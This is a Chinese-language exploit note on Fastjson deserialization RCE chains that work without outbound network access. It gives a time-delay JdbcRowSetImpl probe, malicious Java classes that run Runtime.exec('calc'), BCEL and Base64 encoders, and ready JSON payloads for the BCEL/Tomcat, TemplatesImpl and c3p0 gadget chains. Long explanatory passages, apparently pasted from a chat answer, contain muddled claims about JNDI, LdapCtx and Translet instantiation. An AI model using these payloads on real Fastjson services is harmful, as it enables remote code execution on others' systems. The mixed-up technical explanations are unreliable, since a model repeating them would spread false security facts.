## FastJson不出网

参考 https://xz.aliyun.com/news/11938
参考 https://github.com/safe6Sec/Fastjson

总结：RCE不出网链全部是建立在将要执行的命令文件转成BCEL,BYTE,HEX等格式用到不同的依赖进行调用执行

## 延时判断是否存在漏洞

利用加载本地不存在的JNDI测试延时判断

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}

{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8088/badClassName", "autoCommit":true}}""}
```

1. BCEL-Tomcat&Spring链

攻击代码

```
public class exp {  
    static {  
        try {  
            Runtime.getRuntime().exec("calc");  
        } catch (IOException e) {  
            throw new RuntimeException(e);  
        }  
    }  
}
```

javac ./exp.java 编译成class文件

```
public class bcel {  
    public static void main(String[] args) throws IOException {  
        Path path = Paths.get("D:\\BaiduNetdiskDownload\\demo\\src\\main\\java\\exp.class");  
        byte[] bytes = Files.readAllBytes(path);  
        System.out.println(bytes.length);  
        String encode = Utility.encode(bytes, true);  
        BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter("./res.txt"));  
        bufferedWriter.write("$$BCEL$$" + encode);  
        bufferedWriter.close();  
    }  
}
```

把class文件编译成bcel字节码数据

利用 gadget链

```
{
"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
"driverClassLoader": {
"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
},
"driverClassName": "$$BCEL$$xxxx"
}
```

### 二、 BCEL 加载时的核心执行触发点（按利用优先级排序）

#### 1. 静态代码块（`<clinit>`方法）—— 首选，加载即执行（无需要实例化）

这是 BCEL 恶意类最核心、最常用的执行入口，也是攻击者的首选。

##### 核心原理

- 「静态代码块」是用`static {}`包裹的代码，属于「类级别的初始化逻辑」。
- 当 JVM 加载一个类并完成链接后，**在首次使用该类之前（无需实例化，仅类加载即可），会自动执行静态代码块，且仅执行一次**。
- 在字节码层面，静态代码块的逻辑会被封装到一个名为`<clinit>`（class initialize）的特殊方法中，JVM 会自动调用该方法，无需攻击者手动触发。

##### 为什么 BCEL 场景优先选静态代码块？

- 触发门槛最低：**仅需类加载，无需实例化**（对比无参构造方法需要`new 类()`）。
- 兼容性更强：早期 JDK 处理 BCEL 编码时，仅需完成类加载即可触发`<clinit>`，无需满足额外的实例化条件。
- 隐蔽性更高：无需依赖类的构造方法调用，避免被目标环境的实例化限制拦截。

##### BCEL 恶意类（静态代码块核心示例）

java

运行

```
// 这是BCEL要编码的原始恶意类，核心逻辑在静态代码块中
public class EvilBcel {
    // 静态代码块，类加载时自动执行
    static {
        try {
            // 恶意命令：Windows弹出计算器
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

该类被 BCEL 编码后，目标环境加载时，JVM 会自动执行`<clinit>`方法（即静态代码块逻辑），弹出计算器。

#### 2. 无参构造方法（`<init>`方法）—— 备选，需类实例化

这是第二常用的触发点，和你之前写的`EvilTemplate`类逻辑一致，核心是通过类实例化触发恶意逻辑。

##### 核心原理

- 无参构造方法是类的实例化方法，在字节码层面对应`<init>`方法。
- 当通过`new 类()`实例化类时，JVM 会自动调用`<init>`方法，执行构造方法中的逻辑。
- 在 BCEL 场景中，需要目标环境加载类后，额外触发类的实例化（如 JNDI 的 LDAP 上下文自动实例化该类），才能执行恶意逻辑。

##### 对比静态代码块

- 触发门槛更高：需要类实例化，而静态代码块仅需类加载。
- 兼容性稍差：部分 JNDI 场景中，仅加载类而不实例化，此时构造方法无法触发。

##### BCEL 恶意类（无参构造方法示例）

java

运行

```
public class EvilBcel {
    // 无参构造方法，类实例化时自动执行
    public EvilBcel() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

2. TemplatesImpl链

本地链

1. 攻击代码
```
public class EvilTemplate extends AbstractTranslet {  
    public EvilTemplate() throws IOException {  
        Runtime.getRuntime().exec("calc");  
    }  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
    }  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
    }  
    public static void main(String[] args) throws IOException {  
        EvilTemplate evilTemplate = new EvilTemplate();  
    }  
}
```

2. javac EvilTemplate.java 编译成class文件

3. 编码
```
public class encode {  
    public static void main(String[] args) throws IOException {  
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\BaiduNetdiskDownload\\demo\\src\\main\\java\\EvilTemplate.class"));  
        String s = Base64.getEncoder().encodeToString(bytes);  
        System.out.println(s);  
    }  
}
```

4. 利用
```
{
"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
"_bytecodes": ["字节码"],
'_name': 'a.b',
'_tfactory': {},
"_outputProperties": {},
"_name": "b",
"_version": "1.0",
"allowedProtocols": "all"
}
```

*注意：JSON.parse(payload, Feature.SupportNonPublicField); 必须加Feature.SupportNonPublicField*

你想知道恶意类为什么必须继承`AbstractTranslet`（通常简称 Translet），核心答案是：**这是一种「利用 JDK 原生机制 + 绕过早期 JNDI 限制」的高效利用手段，本质是借助 XSLT Translet 的类加载 / 实例化特性，让目标环境自动执行我们的恶意代码**，具体原因拆解为以下 3 点，由浅入深讲解：

### 一、 核心原因：绕开 JNDI 对「普通恶意类」的加载限制（关键）

早期 JNDI（尤其是 LDAP 协议）在加载远程恶意类时，**并不是所有类都能被直接实例化并执行代码**，存在天然的限制：

- 对于「普通自定义类」（不继承任何特殊父类），JNDI 仅会加载该类的字节码到目标 JVM，但**不会主动实例化该类**（即不会调用构造方法、不会执行任何代码），攻击者的恶意逻辑无法落地。
- 而对于「`AbstractTranslet`的子类」，目标 JDK 的`com.sun.jndi.ldap.LdapCtx`（LDAP 上下文实现类）在处理远程类时，会触发**XSLT Translet 的原生实例化逻辑**—— 它不仅会加载字节码，还会自动创建该类的实例，进而触发无参构造方法中的恶意代码。

简单说：**普通类 = 只加载不执行，Translet 子类 = 加载 + 自动实例化 + 执行构造方法逻辑**，这是最核心的利用价值。

### 二、 次要原因：无第三方依赖，利用门槛极低

`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`是**JDK 内置的类**（从 JDK 1.5 到 JDK 8 均默认包含，尤其是 Oracle JDK），无需目标环境额外引入任何第三方 Jar 包（如 Spring、Commons 等）。

这带来两个关键优势：

1. 兼容性极强：不管目标应用是简单的 Java 程序，还是复杂的 Web 应用，只要使用了存在漏洞的 JDK 版本，就一定包含该父类，不会出现「类找不到」的问题。
2. 隐蔽性更高：无需依赖第三方组件，避免了因目标环境缺少特定依赖而导致利用失败，也减少了被安全设备检测到的概率（第三方恶意类特征更明显）。

对比其他可选的父类（如`javax.servlet.http.HttpServlet`），后者需要目标环境有 Servlet 容器（Tomcat、Jetty 等），依赖条件苛刻，而 Translet 几乎无依赖限制，是攻击者的首选。

### 三、 补充原因：满足类加载的「特殊逻辑」，无需额外触发条件

XSLT Translet 的设计初衷是用于 XML 文档转换，其类的加载和实例化有一套原生的 JDK 内部逻辑：

1. `AbstractTranslet`是抽象类，要求子类必须实现`transform()`方法（这也是我们之前的恶意类中空实现这两个方法的原因），但这个要求仅为满足编译和类加载规范，不影响恶意逻辑的执行。
2. 当 JNDI 加载 Translet 子类时，JDK 内部的`TransletFactory`会自动调用`newInstance()`方法实例化该类，**无需攻击者额外传入参数、调用任何方法**，仅靠类加载这一个动作就能触发构造方法中的恶意命令。

换句话说：**继承 Translet 后，恶意代码的执行是「自动触发」的，不需要目标应用有额外的调用逻辑，简化了利用流程**。

---

### 额外补充：不是唯一选择，但却是最优选择

其实 JNDI 注入的恶意类并非只能继承 Translet，还有其他可选方案（仅作了解）：

1. 利用`javax.management.BadAttributeValueExpException`（反序列化场景）。
2. 利用`com.sun.rowset.JdbcRowSetImpl`（Fastjson 反序列化常用）。
3. 利用`org.springframework.context.support.ClassPathXmlApplicationContext`（有 Spring 依赖时）。

但这些方案要么依赖第三方组件，要么利用条件苛刻，要么容易被防御机制拦截，而**Translet 方案凭借「无依赖、自动执行、兼容性强」的特点，成为了 JNDI 注入（尤其是 LDAP 协议）的最优选择**。

- c3p0链

```
{
"@type": "java.lang.Class",
"val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
},
"f": {
"@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
"userOverridesAsString": "HexAsciiSerializedMap:;HEX值"
}
```